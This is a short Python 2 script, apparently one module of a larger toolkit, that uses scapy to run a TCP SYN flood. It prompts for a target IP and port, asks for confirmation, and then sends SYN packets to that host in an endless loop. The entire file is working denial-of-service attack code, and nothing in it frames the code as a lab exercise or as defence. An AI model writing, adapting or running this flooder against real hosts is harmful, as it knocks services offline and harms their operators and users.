import util
from scapy.all import *

#
# really basic TCP SYN flood
#

def initialize():
	while True:
		try:
			ip = raw_input('[+] Enter [ip:port]: ')
			tmp = raw_input('[+] Flood host \'%s\'.  Is this correct? '%ip)
			if 'no' in tmp.lower() or not ':' in ip:
				return
			break
		except:
			pass
	
	print '[!] Flooding \'%s\'...'%ip
	pkt = IP(dst=ip.split(':')[0])/TCP(sport=15,dport=int(ip.split(':')[1]), window=1000,flags='S')
	try:
		send(pkt, loop=1)	
	except:
		pass
	print '[+] Quit flood.'
